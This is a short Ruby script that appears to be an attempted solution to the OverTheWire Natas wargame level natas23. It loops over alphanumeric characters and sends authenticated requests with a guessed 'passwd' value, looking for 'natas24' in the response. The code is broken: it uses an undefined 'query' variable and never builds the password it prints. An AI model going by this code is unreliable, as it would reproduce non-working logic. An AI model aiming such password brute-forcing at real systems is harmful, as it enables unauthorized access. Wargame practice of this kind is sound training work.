require 'uri'
require 'net/http'

url = URI.parse("http://natas23.natas.labs.overthewire.org/index.php")
http = Net::HTTP.new(url.host, url.port)
chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = ""

(1..13).each do |i|
 chars.each do |c| 
  found = false
  request = Net::HTTP::Get.new(url.request_uri)
  request.basic_auth("natas23", "<censored>")
  request.set_form_data({"passwd" => query})
  response = http.request(request)

  if response.body.include?("natas24")
   puts "Password: " + password
   break
  end
 end
end
